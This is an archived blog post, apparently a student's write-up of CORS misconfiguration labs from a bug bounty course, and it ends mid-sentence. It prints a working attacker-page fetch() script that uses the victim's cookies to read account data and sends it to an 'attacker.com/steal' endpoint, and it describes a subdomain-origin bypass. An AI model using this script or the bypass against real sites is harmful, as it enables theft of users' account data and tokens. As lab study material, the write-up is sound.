# CORS (Cross-Origin Resource Sharing)

- **Source URL:** https://medium.com/@julius.grosserode.19/cors-cross-origin-resource-sharing-53b4d5840f92?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250804072828/https://medium.com/@julius.grosserode.19/cors-cross-origin-resource-sharing-53b4d5840f92
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8924 (id 8924)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Cross-Origin Resource Sharing CORS

This is part of NahamSec’s BugBounty Course series. summary + solutions.

In our first hub we intercept a /me GET request and send it to repeater. For today two haders are important:

```
HTTP/1.1 200 OK
(...)
Access-Control-Allow-Origin: https://noph19pg.eu2.ctfio.com
Access-Control-Allow-Credentials: true
{
    "username": "adam",
    "email": "adam@fakemail.ctf",
    "token": "0eab1525ca4fc468293cd1faa8bc8b61"
}
```
the true boolean tells your browser to send cookies and the Origin determines where this cookie can come from. If we inclue a new header in our request **Origin: https://test.com** we can see this URL reflected in the response Origin header. So in this case any browser from any domain can send requests to this endpoint which is vurnable as we will see. Another red flag for you to look out for if its just straight up set to \* (everything).

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Lets say this webpage is located at **https://victim.com**

Now we can make an AJAX request from a our attacker site:

```
fetch("https://victim.com/api/user-info", {
  method: "GET",
  credentials: "include" // Sends session cookies
})
.then(response => response.text())
.then(data => {
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: data
  });
});
```
Now what just happend?

1. The victim visits `attacker.com`, which executes this script.
2. The script sends a request to `https://victim.com/api/user-info`.
3. Because `Access-Control-Allow-Credentials: true` is enabled, the browser **sends the victim’s session cookies**.
4. The response (containing user info) is sent to [https://attacker.com/steal](https://attacker.com/steal)

## Solutions

**third-party, Access-Control-Allow-Credentials**, **Access-Control-Allow-Origin, options**

## Exploitation

This time we cant just set the Origin to whatever we want. Only one origion is allowed. However we can check wether we can use subdomains or even turn the Origin itself into a subdomain

```
Access-Control-Allow-Origin: https://75igs22m.eu2.ctfio.com
->default
Access-Control-Allow-Origin: https://attacker.com
-> not allowed (dosent work)
Access-Control-Allow-Origin: https://ctfio.com
-> works
Access-Control-Allow-Origin: https://ctfio.com.attacker.com
-> works!
```
Now you just have to create such a subdomain and get a victim on it.

## What about third party cookies?

Nowadays all major Browsers (Firefox, Safari and [Chrome](https://developers.google.com/privacy-sandbox/3pcd)) block third party cookies because of privacy concerns. This aparently limits the number of CORS vurnabilitys however the above example worked without them and i myself dont understand why youd ever need third party cookies for a CORS exploit. I would advise you to just ignore this and get the basic understanding of CORS anyway.

I think the nahamsec course didnt cover it in enough detail. I recommend getting [more practice at PortSwigger here](https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors).

Thanks for
